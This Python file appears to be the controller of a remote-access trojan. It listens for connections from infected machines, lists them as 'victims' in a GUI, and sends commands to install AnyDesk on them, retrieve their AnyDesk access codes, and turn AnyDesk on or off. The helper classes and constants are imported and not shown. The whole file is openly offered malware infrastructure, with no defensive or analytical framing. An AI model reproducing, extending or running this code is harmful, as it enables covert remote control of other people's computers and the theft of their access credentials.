import socket
import threading
from constants import *
from classes.host_gui import HostGUI
from classes.victim import Victim

hostGui = None


def startServer():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((IP, PORT))
    soc.listen()

    while True:
        clientSoc, clientAddr = soc.accept()
        print(f"{clientAddr} has been connected!")

        victim = Victim(clientSoc)
        hostGui.addVictim(victim)


def startButtonOnClick(command, selectedVictim):

    processCommand(command, selectedVictim)


def processCommand(command, selectedVictim):

    if command == INSTALL_ANYDESK_COMMAND:
        selectedVictim.initialize()

    elif command == GET_CODE_COMMAND:
        code = selectedVictim.getCode()
        if code == None:
            hostGui.showError(
                "Anydesk code", "There is no code for this victim !")
        else:
            hostGui.showInfo(
                "Anydesk code", f"The anydesk code for this victim is {code}")

    elif command == POWER_ON_ANYDESK_COMMAND:
        selectedVictim.powerOnAnydesk()

    elif command == POWER_OFF_ANYDESK_COMMAND:
        selectedVictim.powerOffAnydesk()


def main():
    global hostGui

    threading.Thread(target=startServer).start()
    hostGui = HostGUI([INSTALL_ANYDESK_COMMAND, GET_CODE_COMMAND,
                      POWER_ON_ANYDESK_COMMAND, POWER_OFF_ANYDESK_COMMAND], startButtonOnClick)
    hostGui.build()


if __name__ == "__main__":
    main()
